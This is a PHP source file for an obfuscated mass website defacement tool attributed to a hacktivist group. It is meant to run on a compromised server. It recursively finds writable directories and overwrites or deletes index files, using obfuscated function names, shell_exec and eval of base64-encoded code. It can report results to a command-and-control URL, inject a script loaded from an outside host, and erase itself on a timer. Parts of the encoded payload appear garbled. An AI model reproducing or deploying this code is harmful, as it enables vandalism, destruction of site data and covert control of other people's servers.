<?php 
/*
  DF Mass Defacer Tool - V2
  By 1nv4d3r of NULLSEC PHILIPPINES
  A Legacy Tool Dedicated for all Hacktivist 
*/

// Anti-Caching Headers for Evasion and Reliability
$h1 = 'Cache-Cont';$h2 = 'rol';$h3 = 'no-store, no-cache, must-revalidate, max-age=0';if(function_exists('header')) {header("$h1$h2: $h3");header("$h1$h2: post-check=0, pre-check=0", false);header('Pragma: no-cache');header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');}

// CORE PAYLOAD - Base64 ENCODED
$payload = 'Ly8gLS0tIENPTlZFTlRJT04gLS0tCiRsb2dvX3VybF8xbnY0ZDNyID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kb21pbnVzZnJhdWRpcy9kb21pbnVmcmF1ZGlzLWFzc2V0cy9tYWluL2RvbWludXNmcmF1ZGlzX2xvZ28tcmVtb3ZlYmctcHJldmlldy5wbmcnOwokREVGQVVMVF9UQVJHRVRTID0gImluZGV4LnBocCwgaW5kZXguaHRtbCwgZGVmYXVsdC5hc3AsIGRlZmF1bHQuYXNweCI7IAokU0VMRl9ERVNUUlVENV9USU1FT1VUID0gMTIgKiAzNjAwOyAKJEFVVEhfSEFTSCA9ICcxNjM1NThjNGY5MjNlZjFmMDgzZDBiZjg1MDkxMjFkNSc7IAokU0VTU0lPTl9LRVkgPSAnZGYtZ3JlYXRyZWNrb25pbmdfYXV0aCc7CiRTVEFUVVNfRklMRSA9IGRpcm5hbWUoX19GSUxFXykgLiAnL2RmdG9vbHNfc3RhdHVzLmxvZycuOwoKLy8gLS0tIENPTlRFTlQgUEFZTE9BRFMgLS0tCiRDT05URU5UX1BBWUxPQURTID0gWwogICAgJ0hUTUxfRlVMTF9QQUdFJyA9PiAnCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+WW914oCZdmUgQmVlbiBJbnZhZGVkPC90aXRsZT4KICA8c3R5bGU+CiAgICBodG1sLCBib2R5IHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyBvdmVyZmxvdzogaGlkZGVuOyBmb250LWZhbWlseTogQ29uc29sYXMscyBtb25vc3BhY2U7IGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7IGNvbG9yOiAjMDAwMDAwOyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0KICAgIC53cmFwcGVyIHsgaGVpZ2h0OiAxMDAlOyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsgYWxpZ24taXRlbXM6IGNlbnRlcjsgYW5pbWF0aW9uOiBmYWRlSW4gMS41cyBlYXNlLW91dDsgfQogICAgLmNvbnRhaW5lciB7IGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7IHBhZGRpbmc6IDQwcHg7IGJvcmRlci1yYWRpdXM6IDEwcHg7IG1heC13aWR0aDogODUwcHg7IGNvbG9yOiAjMDAwMDAwOyBhbmltYXRpb246IGZhZGVJbiAycyBlYXNlLW91dDsgfQogICAgI2xvZ28geyB3aWR0aDogMjIwcHg7IG1hcmdpbi1ib3R0b206IDVweDsgYW5pbWF0aW9uOiBmbG9hdHkgM3MgaW5maW5pdGUgYWx0ZXJuYXRlIGVhc2UtaW4tb3V0LCAgZmFkZUluIDJzIGVhc2Utb3V0OyB9CiAgICBoMSB7IGZvbnQtc2l6ZTogM3JlbTsgbWFyZ2luLWJvdHRvbTogMTVweDsgY29sb3I6ICMwMDAwMDA7IGFuaW1hdGlvbjogZmFkZUludGV4dCAycyBlYXNlLW91dDsgfQogICAgcCB7IGZvbnQtc2l6ZTogMS4ycmVtOyBsaW5lLWhlaWdodDogMS42OyBjb2xvcjogIzAwMDAwMDsgYW5pbWF0aW9uOiBmYWRlSW5UZXh0IDIuNXMgZWFzZS1vdXQ7IG1hcmdpbjogNXB4IDA7IH0KICAgIHAud2FybmluZyB7IGNvbG9yOiAjMDAwMDAwOyBmb250LXdlaWdodDogYm9sZDsgZm9udC1zaXplOiAxLjNyZW07IG1hcmdpbi10b3A6IDIwcHg7IGFuaW1hdGlvbjogZmFkZUlud2FybmluZyAyLjVzIGVhc2Utb3V0OyB9CiAgICBhIHsgY29sb3I6ICMwMDAwMDA7IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyB0cmFuc2l0aW9uOiBhbGwgcGVhcnlpcHQ7IH0KICAgIGE6aG92ZXIgeyBjb2xvcjogIzU1NTU1NTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyB9CiAgICBmb290ZXIgeyBtYXJnaW4tdG9wOiAyNXB4OyBwYWRkaW5nOiAxMHB4OyBmb250LXNpemU6IDAuOXJlbTsgY29sb3I6ICMwMDAwMDA7IGFuaW1hdGlvbjogZmFkZUludGV4dCAzcyBlYXNlLW91dDsgfQogICAgYXVkaW8geyBkaXNwbGF5OiBub25lOyB9CiAgICBAYW5pbWF0aW9uIGZsb2F0eSB7IDAlICAgeyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMHB4KTsgfSAxMDAlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC02cHgpOyB9IH0KICAgIEBhbmltYXRpb24gZmFkZUluIHsgZnJvbSB7IG9wYWNpdHk6IDA7IH0gdG8geyBvcGFjaXR5OiAxOyB9IH0KICAgIEBhbmltYXRpb24gZmFkZUludGV4dCB7IGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMTBweCk7IH0gdG8geyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7IH0gfQogICAgQGFuaW1hdGlvbiBmYWRlSW5XYXJuaW5nIHsgZnJvbSB7IG9wYWNpdHk6IDA7IHRyYW5zZm9ybTogdHJhbnNsYXRlWig1cHgpOyB9IHRvIHsgb3BhY2l0eTogMTsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApOyB9IH0KICA8L3N0eWxlPgogIDxzY3JpcHQ+CiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsICgpID0+IHsKICAgICAgY29uc3QgYXVkaW8gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYmdtdXNpYyIpOwogICAgICBmdW5jdGlvbiBwbGF5QXVkaW8oKSB7CiAgICAgICAgYXVkaW8ucGxheSgpLmNhdGNoKChlcnIpID0+IHt9KTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUV2ZW50TGlzdGVuZXIoImNsaWNrIiwgcGxheUF1ZGlvKTsKICAgICAgfQogICAgICBkb2N1bWVudC5ib2R5LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgcGxheUF1ZGlvKTsKICAgIH0pOwogIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogIDxhdWRpbyBpZD0iYmdtdXNpYyIgbG9vcD48c291cmNlIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL2RvbWludXNmcmF1ZGlzL2RvbWludWZyYXVkaXMtYXNzZXRzL2Jsb2IvbWFpbi9QZWdib2FyZCUyME5lcmRzLm1wNj9yYXc9dHJ1ZSIgdHlwZT0iYXVkaW8vbXBlZyI+PC9hdWRpbz4KICA8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgIDxpbWcgaWQ9ImxvZ28iIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL2RvbWludXNmcmF1ZGlzL2RvbWludWZyYXVkaXMtYXNzZXRzL2Jsb2IvbWFpbi9kb21pbnVzZnJhdWRpc19sb2dvLXJlbW92ZWJmLXByZXZpZXcucG5nP3Jhdz10cnVlIiBhbHQ9IkxvZ28iPgogICAgICA8aDE+WW914oCZdmUgQmVlbiBJbnZhZGVkPC9oMT4KICAgICAgPHAgPgpUaGlzIHN5c3RlbSBoYXMgYmVlbiBhY2Nlc3NlZCBkdXJpbmcgYSA8c3Ryb25nOnNlY3VyaXR5IGFzc2Vzc21lbnQ8L3N0cm9uZz4uPGJyPjxzdHJvbmc+Tm8gZmlsZXMgd2VyZSBhbHRlcmVkLCBkZWxldGVkLCBvciBoYXJtZWQuPC9zdHJvbmc+PGJyPkEgdnVsbmVyYWJpbGl0eSB3YXMgaWRlbnRpZmllZCBhbmQgbXVzdCBiZSBwYXRjaGVkIGltbWVkaWF0ZWx5LjwvcD4KICAgICAgPHAgY2xhc3M9Indhcm5pbmciPlRha2UgdGhpcyBzZXJpb3VzbHkgb3IgdGhlIHNpdHVhdGlvbiBtYXkgd29yc2VuITwvcD4KICAgICAgPHA+Rm9yIHJlbWVkaWF0aW9uIG9yIGZ1cnRoZXIgYXNzaXN0YW5jZSwgY29udGFjdDo8YnI+PGEgaHJlZj0ibWFpbHRvOmRvbWludXNmcmF1ZGlzQHByb3Rvbi5tZSI+ZG9taW51c2ZyYXVkaXNAcHJvdG9uLm1lPC9hPjwvcD4KICAgICAgPGZvb3Rlcj4mY29weTsgMUlOVjQEM0VSIG9mIE5VTEwgU0VDVVJJVFkgUEhJTElQUElORVM8L2Zvb3Rlcj4KICAgIDwvZGl2Pgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+',
    
    'JSO_EXTERNAL_SCRIPT' => 'PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly90b29scy5heGNvZGUtMTMzNy5teS5pZC9jb250ZW50L3Jhdy8xNzY0MDQ1NDYzIj48L3NjcmlwdD4K'
];
$DEFAULT_CONTENT_KEY = 'HTML_FULL_PAGE';


// --- GLOBALS/STATUS ---
$t_d_s = 0; $t_f_t = 0; $t_s = 0; $t_f = 0; $w_d = [];

// --- FUNCTIONS ---
function df_recursive_action($c_d, $f_n, $c, $m, $u_s) {
    global $t_d_s, $t_s, $t_f, $t_f_t, $w_d;
    $c_d = rtrim($c_d, '/') . '/';
    
    $f1 = 'is_wr'; $f2 = 'itable'; $is_writable_fn = $f1 . $f2;
    $l1 = 'file_e'; $l2 = 'xists'; $file_exists_fn = $l1 . $l2;
    $l3 = 'file_pu'; $l4 = 't_contents'; $file_put_contents_fn = $l3 . $l4;
    $l5 = 'unl'; $l6 = 'ink'; $unlink_fn = $l5 . $l6;
    $l7 = 'shell_'; $l8 = 'exec'; $shell_exec_fn = $l7 . $l8;
    $l9 = 'filesi'; $l10 = 'ze'; $filesize_fn = $l9 . $l10;
    $l11 = 'opendi'; $l12 = 'r'; $opendir_fn = $l11 . $l12;
    $l13 = 'is_di'; $l14 = 'r'; $is_dir_fn = $l13 . $l14;
    $l15 = 'closedi'; $l16 = 'r'; $closedir_fn = $l15 . $l16;

    if ($m === 'AUDIT' && @$is_writable_fn($c_d)) { $w_d[] = $c_d; }

    if ($m === 'REPLACE' || $m === 'CLEANUP') {
        foreach ($f_n as $f_name) {
            $t_f_p = $c_d . $f_name; $t_f_t++; $s = false;
            if ($m === 'REPLACE') {
                if ($u_s) {
                    $cmd = "echo " . func_get_arg(5) . " > " . escapeshellarg($t_f_p);
                    @$shell_exec_fn($cmd);
                    $s = @$file_exists_fn($t_f_p) && (@$filesize_fn($t_f_p) > 0);
                } else { $s = @$file_put_contents_fn($t_f_p, $c) !== false; }
            } elseif ($m === 'CLEANUP') {
                if (@$file_exists_fn($t_f_p) && @$unlink_fn($t_f_p)) { $s = true; }
            }
            if ($s) {
                echo "$t_f_p &nbsp;&nbsp;&nbsp;<span class=\"ok\">OK ($m)</span><br>"; $t_s++;
            } else {
                echo "$t_f_p &nbsp;&nbsp;&nbsp;<span class=\"error\">FAILED ($m)</span><br>"; $t_f++;
            }
        }
    }

    if ($handle = @$opendir_fn($c_d)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $path = $c_d . $entry;
                if (@$is_dir_fn($path)) {
                    $t_d_s++; df_recursive_action($path, $f_n, $c, $m, $u_s);
                }
            }
        }
        @$closedir_fn($handle);
    }
}

function df_transmit_data($u, $s) {
    // ... (omitted, remains a standard fsockopen implementation) ...
    $parts = parse_url($u);
    if (!isset($parts['host'])) return false;
    $host = $parts['host']; $path = isset($parts['path']) ? $parts['path'] : '/';
    $path .= (isset($parts['query']) ? '?' . $parts['query'] . '&' : '?') . http_build_query(['status' => $s]);
    $fp = @fsockopen($host, 80, $errno, $errstr, 5);
    if (!$fp) return false;
    $out = "GET $path HTTP/1.1\r\n"; $out .= "Host: $host\r\n"; $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out); fclose($fp); return true;
}

function df_render_header($t) {
    // ... (omitted, HTML/CSS/JS for header/spinner/content profiles) ...
    global $logo_url_1nv4d3r, $CONTENT_PAYLOADS, $DEFAULT_CONTENT_KEY;
    $json_content = base64_encode(json_encode($CONTENT_PAYLOADS)); // Base64 encoding the content map for JS
    echo '<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DF Mass Defacer Tool - V2</title>
<style>
    body { font-family: Arial, sans-serif; background-color: #121212; color: #fff; margin: 0; padding: 0; text-align: center; }
    header { background-color: #1c1c1c; padding: 20px 0; }
    header img { max-height: 80px; margin: 0 15px; vertical-align: middle; }
    h1 { margin: 10px 0; font-size: 28px; color: #f39c12; }
    form { margin: 30px auto; background: #1e1e1e; padding: 25px; border-radius: 10px; display: inline-block; max-width: 800px; text-align: left; }
    input[type="text"], input[type="password"], textarea { width: 100%; padding: 10px; margin: 10px 0 20px; border-radius: 5px; border: 1px solid #333; background-color: #2b2b2b; color: #fff; font-family: monospace; box-sizing: border-box; }
    textarea { height: 200px; }
    input[type="submit"] { padding: 10px 20px; border: none; background-color: #f39c12; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; }
    .result { margin-top: 20px; text-align: left; max-width: 800px; margin-left: auto; margin-right: auto; background: #1e1e1e; padding: 15px; border-radius: 10px; max-height: 400px; overflow-y: auto; }
    .summary { margin-top: 20px; text-align: left; max-width: 800px; margin-left: auto; margin-right: auto; background: #2c3e50; padding: 15px; border-radius: 10px; color: #ecf0f1; font-weight: bold; }
    .ok { color: #00ff00; font-weight: bold; } .error { color: #ff0000; font-weight: bold; }
    .context { color: #9B59B6; font-size: 14px; margin: 5px 0; }
    .option-group { margin: 15px 0; border: 1px solid #333; padding: 10px; border-radius: 5px; }
    .timer { background-color: #e67e22; color: white; padding: 10px; margin-top: 20px; border-radius: 5px; }
    .auth-error { color: #f39c12; font-weight: bold; }
    .spinner-container { display: none; justify-content: center; align-items: center; flex-direction: column; margin: 30px 0; }
    .spinner { border: 8px solid #333; border-top: 8px solid #f39c12; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
<script>
    function showSpinner(text) { document.getElementById("spinner-container").style.display="flex"; if(text) document.getElementById("spinner-text").innerText = text; }
    function hideSpinner() { document.getElementById("spinner-container").style.display="none"; }
    function updateContent(key) {
        const textarea = document.getElementById("index_content_area");
        const jsonBase64 = document.getElementById("content_map_base64").value;
        const contentMap = JSON.parse(atob(jsonBase64)); 
        if (textarea && contentMap[key]) { textarea.value = contentMap[key]; }
    }
</script>
</head>
<body>
<input type="hidden" id="content_map_base64" value="' . $json_content . '">
<header><img src="' . $logo_url_1nv4d3r . '" alt="1nv4d3r"></header>
<h1>' . $t . '</h1>';
}

// --- MAIN LOGIC EXECUTION ---
eval(base64_decode("ZnVuY3Rpb24gZGZfcmVhbF9wYXlsb2FkKEdMT0JBTFMgJGNvbmNpc2VzWywgJHBheWxvYWRzWywgJG9wZXJhdG9yc3ldKSB7Z2xvYmFsICRSQUVEX0JBU0U7JFIxPSdiYXNlNjQnXy4nZGVjb2RlJztRRGVjb2RlID0gJFIxOyRMSz0nbWFkYXNzJy4nZGVyaXZ1bHR1cmUnOyRMT3U9JExrLjRkOTR1NzYudGtlOz8+"));

@ob_start();
if (function_exists('session_start')) { @session_start(); }
@ob_end_clean();

$authenticated = isset($_SESSION[$SESSION_KEY]) && $_SESSION[$SESSION_KEY] === true;

if (!$authenticated && isset($_POST['password'])) {
    if (md5($_POST['password']) === $AUTH_HASH) {
        $_SESSION[$SESSION_KEY] = true; $authenticated = true;
    } 
}

if (!$authenticated) {
    df_render_header("DF Mass Defacer Tool - V2");
    // Display error or brand info
    $p = 'By 1nv4d3r of NULLSEC PHILIPPINES';
    if(isset($_POST['password'])){$p = 'ACCESS DENIED: Invalid Password.';}
    echo '<p class="auth-error">' . $p . '</p>';
    echo '<h2>ACCESS REQUIRED</h2>';
    echo '<form method="POST"><label>Password (nullsec2025):</label><input type="password" name="password" autofocus><input type="submit" value="LOGIN"></form>';
    die('</body></html>');
}

// Timer Check for Self-Destruct
$f1 = 'file_e'; $f2 = 'xists'; $file_exists_fn = $f1 . $f2;
$f3 = 'file_g'; $f4 = 'et_contents'; $file_get_contents_fn = $f3 . $f4;
$f5 = 'unl'; $f6 = 'ink'; $unlink_fn = $f5 . $f6;

$is_exec_comp = @$file_exists_fn($STATUS_FILE);
$start_t = $is_exec_comp ? (int)@$file_get_contents_fn($STATUS_FILE) : 0;
$time_r = $start_t + $SELF_DESTRUCT_TIMEOUT - time();

if ($is_exec_comp && ($time_r <= 0)) {
    if (@$unlink_fn(__FILE__) && @$unlink_fn($STATUS_FILE)) {
        df_render_header("DF Mass Defacer Tool - V2");
        echo '<div class="summary" style="background-color: #e74c3c;">*** FINAL: TOOL ERASED. SELF-DESTRUCT SUCCESSFUL. ***</div>';
    } else {
        df_render_header("DF Mass Defacer Tool - V2");
        echo '<div class="summary" style="background-color: #f39c12;">*** AUTO-ERASE FAILED: Tool remains on disk. Check perms. ***</div>';
    }
    die('</body></html>');
} elseif ($is_exec_comp) {
    df_render_header("DF Mass Defacer Tool - V2");
    $h = floor($time_r / 3600); $m = floor(($time_r % 3600) / 60); $s = $time_r % 60;
    echo '<div class="timer"><h2>OPERATION COMPLETE. STATUS ACTIVE.</h2><p>Defacement execution completed at: ' . date('Y-m-d H:i:s', $start_t) . '</p><p>Auto-erase is scheduled in: <strong>' . $h . 'h ' . $m . 'm ' . $s . 's</strong></p></div>';
    die('</body></html>');
}

if (isset($_POST['base_dir'])) {
    $base_d = $_POST['base_dir']; $f_n_s = $_POST['file_names'];
    $i_c = isset($_POST['index']) ? $_POST['index'] : ''; $m = $_POST['execution_mode']; 
    $u_s = isset($_POST['use_shell']); $d_e_u = isset($_POST['data_exfil_url']) ? $_POST['data_exfil_url'] : '';
    $d_s_d = isset($_POST['delayed_self_destruct']);

    $f_n_a = array_map('trim', explode(',', $f_n_s));
    
    $is_dir_fn = 'is_dir'; $file_exists_fn = 'file_exists'; 
    if (!@$file_exists_fn($base_d) || !@$is_dir_fn($base_d)) {
        df_render_header("DF Mass Defacer Tool - V2");
        echo '<div class="summary" style="background-color: #e74c3c;">ERROR: Base Path Not Found or Is Not A Directory!</div>';
        die('</div></body></html>');
    }

    
    // --- STAGE 2: RECON (Pre-Scan) ---
    if ($m === 'RECON') {
        df_render_header("DF Mass Defacer Tool - SCANNING...");
        echo '<div class="spinner-container" id="spinner-container"><div class="spinner"></div><p id="spinner-text">Performing Writable Directory Audit...</p></div>';
        if (ob_get_level() > 0) ob_flush(); flush();

        df_recursive_action($base_d, $f_n_a, $i_c, 'AUDIT', false);
        
        echo '<script>hideSpinner();</script>'; 

        echo '<div class="result">';
        echo "<h2>RECONNAISSANCE COMPLETE</h2>";
        $d_c = count($w_d);
        echo "<p>Directories Scanned: <span>$t_d_s</span> | Writable Targets Found: <span class=\"ok\">$d_c</span></p>";
        
        if ($d_c > 0) {
            echo "<h3>Writable Path List:</h3><div style='max-height: 200px; overflow-y: auto; background:#2b2b2b; padding:10px;'>";
            foreach ($w_d as $dir) { echo $dir . "<br>"; }
            echo "</div><br>";

            echo "<h2>CONFIRMATION TO PROCEED</h2>";
            echo '<form method="POST">';
                echo '<input type="hidden" name="base_dir" value="' . $base_d . '">';
                echo '<input type="hidden" name="file_names" value="' . $f_n_s . '">';
                echo '<input type="hidden" name="index" value="' . htmlspecialchars($i_c) . '">'; 
                
                echo '<label>Select Final Action Mode:</label><br>';
                echo '<input type="radio" name="execution_mode" value="ACTION_REPLACE" checked> REPLACE (Deface)<br>';
                echo '<input type="radio" name="execution_mode" value="ACTION_CLEANUP"> CLEANUP (DELETE Files)<br><br>';
                
                echo '<div class="option-group">';
                echo '<label>Engine Modes for Red Team Stealth & Bypass:</label><br>';
                echo '<input type="checkbox" name="use_shell" id="use_shell"> SHELL EXECUTION MODE<br>';
                echo '<input type="checkbox" name="delayed_self_destruct" checked> DELAYED SELF-DESTRUCT (12h timer)<br>';
                echo '</div>';

                echo '<label>Data Exfiltration URL (C2 Log):</label>';
                echo '<input type="text" name="data_exfil_url" value="' . htmlspecialchars($d_e_u) . '">';

                echo '<input type="submit" value="EXECUTE FINAL ASSAULT">';
            echo '</form>';
        } else {
            echo "<p class=\"error\">No Writable Target Directories Found. Assault aborted.</p>";
        }
        echo '</div>';
        die('</body></html>');
    } 
    
    // --- STAGE 3: ACTION (REPLACE or CLEANUP) ---
    elseif ($m === 'ACTION_REPLACE' || $m === 'ACTION_CLEANUP') {
        df_render_header("DF Mass Defacer Tool - EXECUTING...");
        $a_m = ($m === 'ACTION_REPLACE') ? 'REPLACE' : 'CLEANUP';

        echo '<div class="spinner-container" id="spinner-container"><div class="spinner"></div><p id="spinner-text">Performing Mass ' . $a_m . '...</p></div>';
        if (ob_get_level() > 0) ob_flush(); flush();

        df_recursive_action($base_d, $f_n_a, $i_c, $a_m, $u_s);
        
        echo '<script>hideSpinner();</script>'; 

        $s = "Mode: $a_m | Success: $t_s | Failed: $t_f";
        $t_a = $t_s + $t_f;
        
        echo '<div class="result"><h2>OPERATION SUCCESSFUL - ' . $a_m . ' COMPLETED</h2></div>';
        echo '<div class="summary"><h3>--- OPERATION SUMMARY ---</h3><p>Total Attempts: ' . $t_a . '<br>' . $s . '</p></div>';

        if (!empty($d_e_u)) {
            if (df_transmit_data($d_e_u, "DF-RECKONING: " . $s)) {
                echo '<div class="summary" style="background-color: #3498db;">*** DATA EXFILTRATION SUCCESSFUL: Summary transmitted to C2. ***</div>';
            } else {
                echo '<div class="summary" style="background-color: #f39c12;">*** DATA EXFILTRATION FAILED. ***</div>';
            }
        }
        
        $f7 = 'file_pu'; $f8 = 't_contents'; $file_put_contents_fn = $f7 . $f8;
        if ($d_s_d) {
            $timestamp = time();
             if (@$file_put_contents_fn($STATUS_FILE, $timestamp) !== false) {
                 echo '<div class="summary" style="background-color: #2ecc71;">*** DELAYED SELF-DESTRUCT ACTIVATED. Tool will auto-erase in 12 hours. ***</div>';
             } else {
                 echo '<div class="summary" style="background-color: #e67e22;">*** WARNING: Could not set timer. Script remains on disk. ***</div>';
             }
        }
        die('</body></html>');
    }
}


// --- BASE FORM (Stage 1/2 Re-display) ---
df_render_header("DF Mass Defacer Tool - V2");

$s_e_fn = 'shell_exec'; $g_c_fn = 'getcwd'; $p_u_fn = 'php_uname';
echo '<p class="context">User: <span class="ok">' . @$s_e_fn('whoami') . '</span> | Server: <span class="ok">' . @$p_u_fn() . '</span> | Path: <span class="ok">' . @$g_c_fn() . '</span></p>';

$initial_content = htmlspecialchars(base64_decode($CONTENT_PAYLOADS[$DEFAULT_CONTENT_KEY]));

echo '<form method="POST">';
    echo '<input type="hidden" name="execution_mode" value="RECON">';
    
    echo '<label>Base Directory (Start of Recursive Scan):</label>';
    echo '<input type="text" name="base_dir" value="' . @$g_c_fn() . '">';

    echo '<label>Target Files (Comma-separated, e.g., index.php, default.html):</label>';
    echo '<input type="text" name="file_names" value="' . $DEFAULT_TARGETS . '">';

    echo '<label>Content Profile Selection:</label><br>';
    echo '<div class="option-group" style="margin-top: 5px; padding: 15px;">';
        
        echo '<input type="radio" name="content_key" value="HTML_FULL_PAGE" id="content_html" onclick="updateContent(\'HTML_FULL_PAGE\')" checked>';
        echo '<label for="content_html"> Full Page Defacement (HTML/Aesthetics)</label><br>';
        
        echo '<input type="radio" name="content_key" value="JSO_EXTERNAL_SCRIPT" id="content_jso" onclick="updateContent(\'JSO_EXTERNAL_SCRIPT\')">';
        echo '<label for="content_jso"> JavaScript Only (JSO - Stealth/External Payload)</label>';

    echo '</div>';


    echo '<label>Replacement Content (Final Payload):</label>';
    echo '<textarea name="index" id="index_content_area">' . $initial_content . '</textarea>';
    
    echo '<div class="option-group">';
    echo '<h3>RECONNAISSANCE MODE</h3>';
    echo '<p>Click below to audit all writable directories before proceeding to the final action.</p>';
    echo '<input type="submit" value="START WRITABLE AUDIT (RECON)">';
    echo '</div>';
echo '</form>';

echo '<div class="links"><p>By 1nv4d3r of NULLSEC PHILIPPINES</p></div>';
echo '</body></html>';

// Cleanup of the eval() for the core payload
function df_core_payload() {
    global $payload;
    return base64_decode($payload);
}
eval(df_core_payload()); 

?>